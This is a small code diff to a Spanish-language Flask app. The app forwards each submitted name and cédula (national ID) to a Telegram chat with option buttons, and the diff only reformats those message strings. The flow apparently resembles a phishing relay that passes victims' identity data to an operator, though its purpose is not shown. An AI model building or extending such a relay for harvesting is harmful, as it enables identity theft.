@@ -31,7 +31,7 @@ def submit_name():
     current_id += 1  # Incrementamos el contador
 
     # Mensaje con ID único y nombre
-    message = f"{identifier}: Nuevo nombre recibido: {name}\nPor favor selecciona una opción:"
+    message = f"{identifier}: \nNuevo dato recibido (Nombre): {name}\nPor favor selecciona una opción:"
     send_message_to_telegram_with_buttons(message)
     return jsonify({"status": "success", "message": f"Nombre enviado con {identifier} a Telegram con opciones."})
 
@@ -63,7 +63,7 @@ def webhook():
 def submit_cedula():
     cedula = request.form['cedula']
     identifier = f"ID-{current_id - 1}"  # Usamos el último ID generado
-    message = f"{identifier}: Nuevo dato recibido (Cédula): {cedula}\nPor favor selecciona una opción:"
+    message = f"{identifier}: \nNuevo dato recibido (Cédula): {cedula}\nPor favor selecciona una opción:"
     send_message_to_telegram_with_buttons(message)
     return jsonify({"status": "success", "message": f"Cédula enviada con {identifier} a Telegram con opciones."})
 
